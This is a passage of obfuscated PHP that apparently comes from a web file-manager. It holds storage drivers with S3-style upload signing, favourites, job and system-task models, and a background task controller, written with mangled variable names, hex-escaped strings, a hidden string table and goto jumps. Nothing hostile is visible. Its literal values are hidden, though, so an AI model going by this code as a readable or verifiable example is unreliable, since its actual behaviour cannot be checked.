array($∂åãÕî±[430] => $ú§ÛÓÒÓ)); $‚áì€Ù‰[$∂åãÕî±[1339]] = Action($∂åãÕî±[1178])->shareItemInfo($¸®»ÉÛô); } foreach ($‚áì€Ù‰ as $÷´øÖ‰á => $¿ò≤ÍËÏ) { if (!in_array($÷´øÖ‰á, array($∂åãÕî±[93], $∂åãÕî±[92]))) { continue; } foreach ($¿ò≤ÍËÏ as $¯Æ∞ÅÚÇ => $¸®»ÉÛô) { $¸®»ÉÛô = Action($∂åãÕî±[1348])->parsePathChildren($¸®»ÉÛô, array($∂åãÕî±[430] => $ú§ÛÓÒÓ)); $‚áì€Ù‰[$÷´øÖ‰á][$¯Æ∞ÅÚÇ] = Action($∂åãÕî±[1178])->shareItemInfo($¸®»ÉÛô); } } return $‚áì€Ù‰; } public function listAll($üÄ‘íæË) { $ëè°ı†∆ =& $_SERVER[Á≈ ä ∞]; $èÂâçÜë = IO::listAll($üÄ‘íæË); foreach ($èÂâçÜë as &$◊›∑øÔ ) { $âÕƒ¬êú = IO::info($◊›∑øÔ [$ëè°ı†∆[94]]); $âÕƒ¬êú = is_array($âÕƒ¬êú) ? $âÕƒ¬êú : array(); $◊›∑øÔ  = array_merge($âÕƒ¬êú, $◊›∑øÔ ); $◊›∑øÔ [$ëè°ı†∆[96]] = Action($ëè°ı†∆[1178])->shareItemInfo($◊›∑øÔ ); } unset($◊›∑øÔ ); return $èÂâçÜë; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($£úÄ˙ıû) { parent::__construct($£úÄ˙ıû); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ú∏Ò¿˛·) { parent::__construct($ú∏Ò¿˛·); $this->signatureVersion($_SERVER[Á≈ ä ∞][226]); } public function uploadFormData($ÊÇå∆◊§, $¸∏–ÌËˆ = 3600) { $Áë∞¢§ê =& $_SERVER[Á≈ ä ∞]; $ ÕËÌË∏ = $Áë∞¢§ê[208]; $ïÈﬂ°ÉØ = $Áë∞¢§ê[1349]; $∏¶ãˆÔ˙ = $Áë∞¢§ê[72]; $ä≠ˆ˚«∏ = gmdate($Áë∞¢§ê[1350]); $ﬁã›ÜØ≠ = gmdate($Áë∞¢§ê[758]); $¬äÍ˘ã® = $Áë∞¢§ê[1351]; $Õ˚ÄËÄ÷ = $¸∏–ÌËˆ . $Áë∞¢§ê[22]; $àÂß Ú¯ = $Áë∞¢§ê[1313]; $Ö≤Í⁄˝À = array($this->accessKey, $ﬁã›ÜØ≠, $this->region, $∏¶ãˆÔ˙, $¬äÍ˘ã®); $úú˘›ñ˛ = implode($Áë∞¢§ê[18], $Ö≤Í⁄˝À); $úå¯¸ö = array($Áë∞¢§ê[1315] => gmdate($Áë∞¢§ê[1314], strtotime($Áë∞¢§ê[1352])), $Áë∞¢§ê[1316] => array(array($Áë∞¢§ê[1318] => $this->bucket), array($Áë∞¢§ê[1317] => $ ÕËÌË∏), array($Áë∞¢§ê[1319], $Áë∞¢§ê[1320], $Áë∞¢§ê[22]), array($Áë∞¢§ê[1319], $Áë∞¢§ê[1353], $Áë∞¢§ê[22]), array($Áë∞¢§ê[1319], $Áë∞¢§ê[1354], $Áë∞¢§ê[22]), array($Áë∞¢§ê[1321] => $àÂß Ú¯), array($Áë∞¢§ê[1355] => $úú˘›ñ˛), array($Áë∞¢§ê[1356] => $ïÈﬂ°ÉØ), array($Áë∞¢§ê[1357] => $ä≠ˆ˚«∏), array($Áë∞¢§ê[1358] => $Õ˚ÄËÄ÷))); $≤Ñƒπ â = base64_encode(json_encode($úå¯¸ö)); $ÿ◊¶ë∫¥ = hash_hmac($Áë∞¢§ê[1359], $ﬁã›ÜØ≠, $Áë∞¢§ê[1360] . $this->secret, !0); $€ä—ü®ô = hash_hmac($Áë∞¢§ê[1359], $this->region, $ÿ◊¶ë∫¥, !0); $√ˆÇ·˝¬ = hash_hmac($Áë∞¢§ê[1359], $∏¶ãˆÔ˙, $€ä—ü®ô, !0); $µ¯≥Ö•™ = hash_hmac($Áë∞¢§ê[1359], $¬äÍ˘ã®, $√ˆÇ·˝¬, !0); $ô∫Ó“ﬂ = hash_hmac($Áë∞¢§ê[1359], $≤Ñƒπ â, $µ¯≥Ö•™); $œí¶œ¿œ = array($Áë∞¢§ê[225] => $Áë∞¢§ê[22], $Áë∞¢§ê[1361] => $Áë∞¢§ê[22], $Áë∞¢§ê[1317] => $ ÕËÌË∏, $Áë∞¢§ê[1321] => $àÂß Ú¯, $Áë∞¢§ê[1325] => $≤Ñƒπ â, $Áë∞¢§ê[1362] => $úú˘›ñ˛, $Áë∞¢§ê[1363] => $ïÈﬂ°ÉØ, $Áë∞¢§ê[1364] => $ä≠ˆ˚«∏, $Áë∞¢§ê[1365] => $Õ˚ÄËÄ÷, $Áë∞¢§ê[1366] => $ô∫Ó“ﬂ, $Áë∞¢§ê[191] => $this->getHost()); return $œí¶œ¿œ; } } goto D¯»Ô≥ÓŸ; Då◊ıö·ûÎ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\164\141\163\153\x4c\x69\163\164"; public $field = array("\x6e\141\x6d\x65", "\164\x79\x70\145", "\x65\x76\x65\156\164", "\x74\151\x6d\145", "\144\x65\163\x63", "\163\171\163\164\145\x6d", "\x65\x6e\x61\142\154\145", "\154\141\163\164\x52\x75\156", "\163\x6f\x72\x74"); public function listData($£“›’ôﬂ = false, $Ûó˘±¸ƒ = "\163\157\x72\164", $–€“‹ÊŒ = false) { return parent::listData($£“›’ôﬂ, $Ûó˘±¸ƒ, $–€“‹ÊŒ); } public function add($÷∆‡∑çÛ) { $ªﬂ∑Åﬁæ =& $_SERVER[Á≈ ä ∞]; $®‰…©Áª = $this->findByName($÷∆‡∑çÛ[$ªﬂ∑Åﬁæ[42]]); if ($®‰…©Áª) { return !1; } $÷∆‡∑çÛ[$ªﬂ∑Åﬁæ[1618]] = 0; $÷∆‡∑çÛ[$ªﬂ∑Åﬁæ[1854]] = $this->getSort(); return parent::insert($÷∆‡∑çÛ); } private function getSort() { $√˛ÃêÓ¥ =& $_SERVER[Á≈ ä ∞]; $∆£€¡˘ä = parent::listData(); $‰Î¿≤æœ = array_to_keyvalue($∆£€¡˘ä, $√˛ÃêÓ¥[22], $√˛ÃêÓ¥[1854]); return empty($‰Î¿≤æœ) ? 0 : max($‰Î¿≤æœ) + 1; } public function update($–Ôñíä´, $⁄º¥∞Íè) { $Œì Ö°¥ =& $_SERVER[Á≈ ä ∞]; $Ôì¯‹ƒ™ = $this->listData($–Ôñíä´); $’ºÇ°Ø⁄ = $this->findByName($⁄º¥∞Íè[$Œì Ö°¥[42]]); if (!$Ôì¯‹ƒ™ || $’ºÇ°Ø⁄ && $’ºÇ°Ø⁄[$Œì Ö°¥[408]] != $Ôì¯‹ƒ™[$Œì Ö°¥[408]]) { return !1; } return parent::update($–Ôñíä´, $⁄º¥∞Íè); } public function remove($Éñ∏îﬁÍ, $ìúèŒ”˚ = false) { $‹ı˛Ωª =& $_SERVER[Á≈ ä ∞]; $é˚õ∞ïí = $this->listData($Éñ∏îﬁÍ); if (!$é˚õ∞ïí) { return; } if (!$ìúèŒ”˚ && $é˚õ∞ïí[$‹ı˛Ωª[1279]] == $‹ı˛Ωª[98]) { return !1; } return parent::remove($Éñ∏îﬁÍ); } public function enable($ŸÌ†‹ƒ∞, $…˚ﬁ°ôê) { return $this->update($ŸÌ†‹ƒ∞, array($_SERVER[Á≈ ä ∞][2257] => $…˚ﬁ°ôê)); } public function run($Í∫ôÂ”ä) { return $this->update($Í∫ôÂ”ä, array($_SERVER[Á≈ ä ∞][2269] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($ãÑÆåÿê) { $˜ãıˆú» =& $_SERVER[Á≈ ä ∞]; return array($˜ãıˆú»[1941] => array(USER_ID, $˜ãıˆú»[2270])); } protected function listData() { $ÉÙÇë≤π =& $_SERVER[Á≈ ä ∞]; $≈π◊úÔÏ = array($ÉÙÇë≤π[1649] => USER_ID, $ÉÙÇë≤π[493] => 0); $Åí¡À∫› = $ÉÙÇë≤π[2271]; $≠Ôâ¶µø = $this->field($Åí¡À∫›)->where($≈π◊úÔÏ)->order($ÉÙÇë≤π[2272])->select(); return $≠Ôâ¶µø ? $≠Ôâ¶µø : array(); } protected function resetCache() { } protected function listView() { $≠ïë‰Õß =& $_SERVER[Á≈ ä ∞]; $ã›Ô‚Æ = $this->listData(); $î‚òÿÅ˙ = array_filter_by_field($ã›Ô‚Æ, $≠ïë‰Õß[43], $≠ïë‰Õß[425]); $öâÏÊ¥Ë = array_to_keyvalue($î‚òÿÅ˙, $≠ïë‰Õß[22], $≠ïë‰Õß[94]); if (!$öâÏÊ¥Ë) { return $ã›Ô‚Æ; } $ÚÖ◊‚≈Å = 2000; $°„·ü´Î = array($≠ïë‰Õß[426] => array($≠ïë‰Õß[427], $öâÏÊ¥Ë)); $√°ÈÔéΩ = Model($≠ïë‰Õß[832])->listSource($°„·ü´Î, $ÚÖ◊‚≈Å); $√°ÈÔéΩ = array_merge($√°ÈÔéΩ[$≠ïë‰Õß[93]], $√°ÈÔéΩ[$≠ïë‰Õß[92]]); $√°ÈÔéΩ = array_to_keyvalue($√°ÈÔéΩ, $≠ïë‰Õß[411]); foreach ($ã›Ô‚Æ as $ô¢ê˘¯⁄ => $‘íïºÃÅ) { $ÃË¨Œà∆ = $√°ÈÔéΩ[$‘íïºÃÅ[$≠ïë‰Õß[94]]]; $ÃË¨Œà∆ = $ÃË¨Œà∆ ? $ÃË¨Œà∆ : array(); $ã›Ô‚Æ[$ô¢ê˘¯⁄] = array_merge($ÃË¨Œà∆, $‘íïºÃÅ); } return $ã›Ô‚Æ; } protected function addFav($·•íòŒÏ, $ıªÚ—ÔÍ = '', $¬¸Ωßä = "\x73\157\165\x72\143\145") { $„´Ûö“≤ =& $_SERVER[Á≈ ä ∞]; $ã˝¢∫˜‡ = array($„´Ûö“≤[1649] => USER_ID, $„´Ûö“≤[493] => 0, $„´Ûö“≤[431] => $¬¸Ωßä, $„´Ûö“≤[430] => $·•íòŒÏ); if ($this->where($ã˝¢∫˜‡)->find()) { return !1; } $ã˝¢∫˜‡ = array($„´Ûö“≤[1649] => USER_ID, $„´Ûö“≤[493] => 0); $ÕâÁé¬π = $this->where($ã˝¢∫˜‡)->max($„´Ûö“≤[1854]); if (!$ÕâÁé¬π) { $ÕâÁé¬π = 0; } if (!$ıªÚ—ÔÍ && $¬¸Ωßä == $„´Ûö“≤[425]) { $±‡Á´„Æ = Model($„´Ûö“≤[1330])->where(array($„´Ûö“≤[426] => $·•íòŒÏ))->find(); if (!$±‡Á´„Æ) { return !1; } $ıªÚ—ÔÍ = $±‡Á´„Æ[$„´Ûö“≤[42]]; } $ıªÚ—ÔÍ = $this->getAutoName($ıªÚ—ÔÍ); $§¶—›€Ò = array($„´Ûö“≤[1649] => USER_ID, $„´Ûö“≤[493] => 0, $„´Ûö“≤[429] => $ıªÚ—ÔÍ, $„´Ûö“≤[430] => $·•íòŒÏ, $„´Ûö“≤[431] => $¬¸Ωßä, $„´Ûö“≤[1834] => $ÕâÁé¬π + 1); return $this->add($§¶—›€Ò); } protected function remove($π„Ú∞›Ô) { $¿¬û„•Ï =& $_SERVER[Á≈ ä ∞]; $¢ÓÇ˜÷ﬁ = array($¿¬û„•Ï[1649] => USER_ID, $¿¬û„•Ï[428] => $π„Ú∞›Ô); return $this->where($¢ÓÇ˜÷ﬁ)->delete(); } protected function removeByName($˝ﬁ∫®∂•) { $∫™¥«Ê∂ =& $_SERVER[Á≈ ä ∞]; $ò∞Ú˛…… = array($∫™¥«Ê∂[1649] => USER_ID, $∫™¥«Ê∂[429] => $˝ﬁ∫®∂•, $∫™¥«Ê∂[493] => 0); return $this->where($ò∞Ú˛……)->delete(); } protected function rename($ä‡Æûß», $äûÊ…Ë») { $‘¡æØä∆ =& $_SERVER[Á≈ ä ∞]; if ($ä‡Æûß» == $äûÊ…Ë») { return !1; } $ﬂﬁºΩ»£ = $this->getAutoName($äûÊ…Ë»); if ($äûÊ…Ë» != $ﬂﬁºΩ»£) { return !1; } $ΩÓ∆ΩÔº = array($‘¡æØä∆[1649] => USER_ID, $‘¡æØä∆[493] => 0, $‘¡æØä∆[42] => $ä‡Æûß»); return $this->where($ΩÓ∆ΩÔº)->save(array($‘¡æØä∆[42] => $äûÊ…Ë»)); } protected function resetSort($¢óìΩ†) { $ﬂŒ∫ù± =& $_SERVER[Á≈ ä ∞]; $¢óìΩ† = is_array($¢óìΩ†) ? $¢óìΩ† : array(); $ê£Ÿƒ˘ﬂ = array($ﬂŒ∫ù±[1649] => USER_ID); for ($‘ø≠Ãìº = 0; $‘ø≠Ãìº < count($¢óìΩ†); $‘ø≠Ãìº++) { $ê£Ÿƒ˘ﬂ[$ﬂŒ∫ù±[428]] = $¢óìΩ†[$‘ø≠Ãìº]; $this->where($ê£Ÿƒ˘ﬂ)->save(array($ﬂŒ∫ù±[1834] => $‘ø≠Ãìº + 1)); } return !0; } protected function moveTop($íÈÅã∆ò) { $»ﬂÎñ…à =& $_SERVER[Á≈ ä ∞]; $¯…ıôïÿ = array($»ﬂÎñ…à[1649] => USER_ID, $»ﬂÎñ…à[493] => 0); $»æ•◊•∑ = $this->where($¯…ıôïÿ)->where(array($»ﬂÎñ…à[42] => $íÈÅã∆ò))->find(); if (!$»æ•◊•∑) { return; } $ÃÎÔ˛Â≈ = $this->field($»ﬂÎñ…à[408])->where($¯…ıôïÿ)->order($»ﬂÎñ…à[2272])->select(); $ÃÎÔ˛Â≈ = array_to_keyvalue($ÃÎÔ˛Â≈, $»ﬂÎñ…à[22], $»ﬂÎñ…à[408]); $Ÿß°º”¢ = $ÃÎÔ˛Â≈; $ÃÎÔ˛Â≈ = array_remove_value($ÃÎÔ˛Â≈, $»æ•◊•∑[$»ﬂÎñ…à[408]]); array_unshift($ÃÎÔ˛Â≈, $»æ•◊•∑[$»ﬂÎñ…à[408]]); return $this->resetSort($ÃÎÔ˛Â≈); } protected function moveBottom($ÅÅäÔÃç) { $ΩÈ•Ü∂æ =& $_SERVER[Á≈ ä ∞]; $çªﬂ…ºÎ = array($ΩÈ•Ü∂æ[1649] => USER_ID, $ΩÈ•Ü∂æ[493] => 0); $Âõµó’ö = $this->where($çªﬂ…ºÎ)->max($ΩÈ•Ü∂æ[1854]); $•ÇÚ‰⁄õ = array($ΩÈ•Ü∂æ[1854] => $Âõµó’ö + 1); return $this->where($çªﬂ…ºÎ)->where(array($ΩÈ•Ü∂æ[42] => $ÅÅäÔÃç))->save($•ÇÚ‰⁄õ); } private function getAutoName($ ≥öú»ª) { $◊∆¢˛Á¨ =& $_SERVER[Á≈ ä ∞]; $¥ÕÕ¿»≠ = array($◊∆¢˛Á¨[1649] => USER_ID, $◊∆¢˛Á¨[493] => 0); $ï‡ÌÔç¸ = $this->field($◊∆¢˛Á¨[42])->where($¥ÕÕ¿»≠)->select(); $ï‡ÌÔç¸ = array_to_keyvalue($ï‡ÌÔç¸, $◊∆¢˛Á¨[22], $◊∆¢˛Á¨[42]); if (!$ï‡ÌÔç¸ || !in_array($ ≥öú»ª, $ï‡ÌÔç¸)) { return $ ≥öú»ª; } for ($Õü òÔΩ = 0; $Õü òÔΩ < count($ï‡ÌÔç¸); $Õü òÔΩ++) { if (!in_array($ ≥öú»ª . "\x28{$Õü òÔΩ}\x29", $ï‡ÌÔç¸)) { return $ ≥öú»ª . "\x28{$Õü òÔΩ}\51"; } } return $ ≥öú»ª . "\50{$Õü òÔΩ}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\56\152\x6f\x62\x4c\x69\163\164"; public $field = array("\x6e\141\155\x65", "\144\x65\163\143", "\163\157\x72\x74"); const JOB_KEY = "\x73\x65\x6c\x66\112\x6f\x62\114\151\x73\x74"; public function listData($ ≈´‘›√ = false, $‹˝‰ı∑è = "\163\x6f\162\164", $Ï¯çΩö∫ = false) { return parent::listData($ ≈´‘›√, $‹˝‰ı∑è, $Ï¯çΩö∫); } public function remove($¸ÛÆµ¸î) { return parent::remove($¸ÛÆµ¸î); } public function add($±¿ªˆê–) { $©øí¶”ˆ =& $_SERVER[Á≈ ä ∞]; if ($this->findByName($±¿ªˆê–[$©øí¶”ˆ[42]])) { return !1; } $±¿ªˆê–[$©øí¶”ˆ[1854]] = $this->getSort(); return parent::insert($±¿ªˆê–); } private function getSort() { $åë’∂—œ =& $_SERVER[Á≈ ä ∞]; $Œ¿ó∆Óµ = parent::listData(); $ÚÊÇ¡°Æ = array_to_keyvalue($Œ¿ó∆Óµ, $åë’∂—œ[22], $åë’∂—œ[1854]); return empty($ÚÊÇ¡°Æ) ? 0 : max($ÚÊÇ¡°Æ) + 1; } public function update($œâÍÍû·, $ÜôºÖó‹) { $¥’Ã±®ù =& $_SERVER[Á≈ ä ∞]; $ˆïÈ„¡î = parent::listData($œâÍÍû·); $Ûç”‹≈ë = $this->findByName($ÜôºÖó‹[$¥’Ã±®ù[42]]); if (!$ˆïÈ„¡î || $Ûç”‹≈ë && $Ûç”‹≈ë[$¥’Ã±®ù[408]] != $ˆïÈ„¡î[$¥’Ã±®ù[408]]) { return !1; } return parent::update($œâÍÍû·, $ÜôºÖó‹); } public function setUserJob($ßŒâû˙®, $‚≠ Ÿá∫) { $Ñ∂ò›ﬁ∫ =& $_SERVER[Á≈ ä ∞]; if (!is_array($‚≠ Ÿá∫)) { $‚≠ Ÿá∫ = array($‚≠ Ÿá∫); } $°»•œı  = parent::listData(); $¢Õ˜»◊÷ = array_to_keyvalue($°»•œı , $Ñ∂ò›ﬁ∫[42]); $ÏÕπ⁄¯” = $Ñ∂ò›ﬁ∫[387]; foreach ($‚≠ Ÿá∫ as $Åê∫™Äö) { if ($¢Õ˜»◊÷[$Åê∫™Äö]) { $ÏÕπ⁄¯” .= $¢Õ˜»◊÷[$Åê∫™Äö][$Ñ∂ò›ﬁ∫[408]] . $Ñ∂ò›ﬁ∫[60]; } else { $‚Ôﬂ÷’Œ = $this->add($Åê∫™Äö); $ÏÕπ⁄¯” .= $‚Ôﬂ÷’Œ . $Ñ∂ò›ﬁ∫[60]; } } $ÏÕπ⁄¯” = rtrim($ÏÕπ⁄¯”, $Ñ∂ò›ﬁ∫[60]); Model($Ñ∂ò›ﬁ∫[544])->metaSet($ßŒâû˙®, self::JOB_KEY, $ÏÕπ⁄¯”); } public function getUserJob($¸‚∆Ó†¿) { $ÚÕÎΩ‰à = Model($_SERVER[Á≈ ä ∞][544])->metaGet($¸‚∆Ó†¿); return $this->getUserJobInfo($ÚÕÎΩ‰à[self::JOB_KEY]); } public function getUserJobInfo($Ë¨É¡Å¨) { $Û≤Ì∆ß’ =& $_SERVER[Á≈ ä ∞]; $ï¡“˜Ñõ = explode($Û≤Ì∆ß’[60], $Ë¨É¡Å¨); $‘ƒıÄÌã = parent::listData(); $‘ƒıÄÌã = array_remove_key($‘ƒıÄÌã, $Û≤Ì∆ß’[210]); $¢¬°áπî = array(); foreach ($ï¡“˜Ñõ as $É∏Ç»«§) { if (isset($‘ƒıÄÌã[$É∏Ç»«§])) { $¢¬°áπî[] = $‘ƒıÄÌã[$É∏Ç»«§]; } } return $¢¬°áπî; } } goto f»’å≥ê€©; C÷ÊÒËÙ°á: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($∫ºÓÌãÑ) { parent::__construct($∫ºÓÌãÑ); $this->signatureVersion($_SERVER[Á≈ ä ∞][226]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } define($_SERVER[Á≈ ä ∞][247], 1); define($_SERVER[Á≈ ä ∞][248], 2); goto f¡µ—°€‰≠; dûÉππﬁΩ£: class Task { const STATYS_STOP = "\x73\164\157\x70"; const STATYS_RUNNING = "\x72\165\x6e\156\x69\156\x67"; const STATYS_KILL = "\153\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($≤À∫ıÊ…, $ƒÚ©Æ¯„ = '', $¡ûˆìõ» = 0, $¥Ã›Æêû = '') { $¥ÜöõÂÙ =& $_SERVER[Á≈ ä ∞]; if (self::get($≤À∫ıÊ…)) { return; } $this->task = array($¥ÜöõÂÙ[408] => $≤À∫ıÊ…, $¥ÜöõÂÙ[1658] => USER_ID, $¥ÜöõÂÙ[1557] => $¥Ã›Æêû, $¥ÜöõÂÙ[43] => $ƒÚ©Æ¯„, $¥ÜöõÂÙ[1067] => $¥ÜöõÂÙ[22], $¥ÜöõÂÙ[793] => $¡ûˆìõ», $¥ÜöõÂÙ[1659] => 0, $¥ÜöõÂÙ[1660] => 0, $¥ÜöõÂÙ[1661] => 0, $¥ÜöõÂÙ[1662] => timeFloat(), $¥ÜöõÂÙ[1663] => 0, $¥ÜöõÂÙ[1664] => 0, $¥ÜöõÂÙ[1665] => 0, $¥ÜöõÂÙ[1666] => 0, $¥ÜöõÂÙ[757] => $¥ÜöõÂÙ[1617]); $GLOBALS[$¥ÜöõÂÙ[1667]] = 1; Hook::bind($¥ÜöõÂÙ[1622], array($this, $¥ÜöõÂÙ[1668])); Hook::bind($¥ÜöõÂÙ[1669], array($this, $¥ÜöõÂÙ[1670])); $this->startAfter(); Hook::trigger($¥ÜöõÂÙ[1671], $this->task); $this->task[$¥ÜöõÂÙ[1664]] = timeFloat(); } public function end() { $˚π‹ﬁóπ =& $_SERVER[Á≈ ä ∞]; if (!$this->task) { return; } if ($this->task[$˚π‹ﬁóπ[1664]]) { self::valueSet($this->task[$˚π‹ﬁóπ[408]], !1); } $Í©ﬂä˙¶ = timeFloat() - $this->task[$˚π‹ﬁóπ[1662]]; self::log($˚π‹ﬁóπ[1672] . $this->task[$˚π‹ﬁóπ[408]] . $˚π‹ﬁóπ[1673] . $Í©ﬂä˙¶ . $˚π‹ﬁóπ[1674]); Hook::unbind($˚π‹ﬁóπ[1622], array($this, $˚π‹ﬁóπ[1668])); Hook::unbind($˚π‹ﬁóπ[1669], array($this, $˚π‹ﬁóπ[1670])); $this->endAfter(); $this->task = !1; } public function update($∂ßÑûŸ⁄ = 0, $¨˛óéÑ… = false) { $¢Í‹‰Ú’ =& $_SERVER[Á≈ ä ∞]; $˜™ò´Ωë =& $this->task; if (!$˜™ò´Ωë) { return; } $˜™ò´Ωë[$¢Í‹‰Ú’[1659]] += $∂ßÑûŸ⁄; $˜™ò´Ωë[$¢Í‹‰Ú’[1663]] = timeFloat(); if ($˜™ò´Ωë[$¢Í‹‰Ú’[793]]) { if ($˜™ò´Ωë[$¢Í‹‰Ú’[793]] < $˜™ò´Ωë[$¢Í‹‰Ú’[1659]]) { $˜™ò´Ωë[$¢Í‹‰Ú’[793]] = $˜™ò´Ωë[$¢Í‹‰Ú’[1659]]; } $ù√î‹‡¢ = timeFloat() - $˜™ò´Ωë[$¢Í‹‰Ú’[1662]] - $˜™ò´Ωë[$¢Í‹‰Ú’[1665]]; if ($ù√î‹‡¢ <= 0) { $ù√î‹‡¢ = 0.001; } $˜™ò´Ωë[$¢Í‹‰Ú’[1660]] = $˜™ò´Ωë[$¢Í‹‰Ú’[1659]] / $˜™ò´Ωë[$¢Í‹‰Ú’[793]]; $˜™ò´Ωë[$¢Í‹‰Ú’[1661]] = $˜™ò´Ωë[$¢Í‹‰Ú’[1659]] / $ù√î‹‡¢; if ($˜™ò´Ωë[$¢Í‹‰Ú’[1660]] > 0) { $˜™ò´Ωë[$¢Í‹‰Ú’[1666]] = $ù√î‹‡¢ * (1 - $˜™ò´Ωë[$¢Í‹‰Ú’[1660]]) / $˜™ò´Ωë[$¢Í‹‰Ú’[1660]]; } $˜™ò´Ωë[$¢Í‹‰Ú’[1666]] = $˜™ò´Ωë[$¢Í‹‰Ú’[1666]] <= 0 ? 0 : $˜™ò´Ωë[$¢Í‹‰Ú’[1666]]; } $this->updateAfter(); $∞‘§—è¡ = 0.2; if (timeFloat() - $˜™ò´Ωë[$¢Í‹‰Ú’[1664]] < $∞‘§—è¡ && !$¨˛óéÑ…) { return; } $œ—∂‘í≤ = self::get($˜™ò´Ωë[$¢Í‹‰Ú’[408]]); $Ñâœ‰ü◊ = $œ—∂‘í≤[$¢Í‹‰Ú’[757]]; if ($Ñâœ‰ü◊ == self::STATYS_KILL) { $ªßﬂ—Ñ˘ = array($¢Í‹‰Ú’[1675] => LNG($¢Í‹‰Ú’[1676]), $¢Í‹‰Ú’[1194] => !1); Cache::set($¢Í‹‰Ú’[1677] . $this->task[$¢Í‹‰Ú’[408]], $ªßﬂ—Ñ˘, 30); $this->onKill(); $this->end(); die; } else { if ($Ñâœ‰ü◊ == self::STATYS_STOP) { $¸˜¶Ìò° = 2; $œ—∂‘í≤[$¢Í‹‰Ú’[1665]] += $¸˜¶Ìò°; self::valueSet($˜™ò´Ωë[$¢Í‹‰Ú’[408]], $œ—∂‘í≤); sleep($¸˜¶Ìò°); $this->update(); return; } } $˜™ò´Ωë[$¢Í‹‰Ú’[757]] = $Ñâœ‰ü◊ ? $Ñâœ‰ü◊ : $˜™ò´Ωë[$¢Í‹‰Ú’[757]]; $˜™ò´Ωë[$¢Í‹‰Ú’[1665]] = $œ—∂‘í≤[$¢Í‹‰Ú’[1665]] ? $œ—∂‘í≤[$¢Í‹‰Ú’[1665]] : 0; $˜™ò´Ωë[$¢Í‹‰Ú’[1664]] = timeFloat(); Hook::trigger($¢Í‹‰Ú’[1678], $˜™ò´Ωë); self::valueSet($˜™ò´Ωë[$¢Í‹‰Ú’[408]], $˜™ò´Ωë); } public function onKillSet($»∞äÅ›Û, $Ï∑íõ…É = array()) { $this->onKillCall = array($»∞äÅ›Û, $Ï∑íõ…É); } public function onKill() { $…›Å‘Í· =& $_SERVER[Á≈ ä ∞]; self::log($…›Å‘Í·[1672] . $this->task[$…›Å‘Í·[408]] . $…›Å‘Í·[1679]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¬∂˘—çΩ) { $“Èíü’√ =& $_SERVER[Á≈ ä ∞]; Cache::set($“Èíü’√[1677] . $this->task[$“Èíü’√[408]], $¬∂˘—çΩ, 60); return $¬∂˘—çΩ; } public static function get($€ìæ‡ãé) { $Ô’Öœè∞ =& $_SERVER[Á≈ ä ∞]; $ΩÏ©áÍˆ = self::valueGet($€ìæ‡ãé); if (is_array($ΩÏ©áÍˆ) && $ΩÏ©áÍˆ[$Ô’Öœè∞[1680]]) { $‚“Ìà¸Œ = ActionApply($ΩÏ©áÍˆ[$Ô’Öœè∞[1680]], array($ΩÏ©áÍˆ)); $ΩÏ©áÍˆ = is_array($‚“Ìà¸Œ) ? $‚“Ìà¸Œ : $ΩÏ©áÍˆ; } return $ΩÏ©áÍˆ; } public static function listData() { $∫ó‚¡Ωñ = self::valueGet(); return array_sort_by($∫ó‚¡Ωñ, $_SERVER[Á≈ ä ∞][1662], !0); } public static function kill($ßÿˆÂÎ) { return self::changeStatus($ßÿˆÂÎ, self::STATYS_KILL); } public static function stop($ÁÄª˝Ÿò) { return self::changeStatus($ÁÄª˝Ÿò, self::STATYS_STOP); } public static function restart($áøÑÿïé) { return self::changeStatus($áøÑÿïé, self::STATYS_RUNNING); } public static function killAll() { $˚Ì˝¸œ€ =& $_SERVER[Á≈ ä ∞]; $§®¥é∏ = self::listData(); foreach ($§®¥é∏ as $Åü≈¡ºà) { self::kill($Åü≈¡ºà[$˚Ì˝¸œ€[408]]); } sleep(2); foreach ($§®¥é∏ as $Åü≈¡ºà) { self::valueSet($Åü≈¡ºà[$˚Ì˝¸œ€[408]], !1); } } private static function changeStatus($÷ó◊’Æ›, $·™Áƒ≠é) { $Æí∫»ÚΩ =& $_SERVER[Á≈ ä ∞]; $ëÏØÿÎΩ = self::valueGet($÷ó◊’Æ›); if (!$ëÏØÿÎΩ) { return !1; } $ëÏØÿÎΩ[$Æí∫»ÚΩ[757]] = $·™Áƒ≠é; self::valueSet($÷ó◊’Æ›, $ëÏØÿÎΩ); self::log($Æí∫»ÚΩ[1681] . $ëÏØÿÎΩ[$Æí∫»ÚΩ[408]] . $Æí∫»ÚΩ[1682] . $·™Áƒ≠é); return !0; } public static function valueGet($°Û©≈Ô = false) { $–ÓçÿÑõ =& $_SERVER[Á≈ ä ∞]; if ($°Û©≈Ô) { $ÄÕ¯àª˙ = Model($–ÓçÿÑõ[456])->where(array($–ÓçÿÑõ[104] => $°Û©≈Ô, $–ÓçÿÑõ[43] => $–ÓçÿÑõ[1074]))->find(); return $ÄÕ¯àª˙ ? json_decode($ÄÕ¯àª˙[$–ÓçÿÑõ[383]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($‡“‚∂¯≥ = false) { $≤äÕçùΩ =& $_SERVER[Á≈ ä ∞]; $Ä¢Ëˆ“ù = array($≤äÕçùΩ[43] => $≤äÕçùΩ[1074]); if ($‡“‚∂¯≥) { $Ä¢Ëˆ“ù[$≤äÕçùΩ[1658]] = $‡“‚∂¯≥; } $ØÖıæ⁄¯ = Model($≤äÕçùΩ[456])->where($Ä¢Ëˆ“ù)->select(); $ØÖıæ⁄¯ = $ØÖıæ⁄¯ ? $ØÖıæ⁄¯ : array(); foreach ($ØÖıæ⁄¯ as $∂øíÛ£◊ => $∑ÛöÿøÆ) { $ØÖıæ⁄¯[$∂øíÛ£◊] = json_decode($∑ÛöÿøÆ[$≤äÕçùΩ[383]], !0); } return $ØÖıæ⁄¯; } public static function valueSet($Ô¢ÜÉïÿ, $©Í´∆–¬) { $£∞ﬁ’úË =& $_SERVER[Á≈ ä ∞]; if 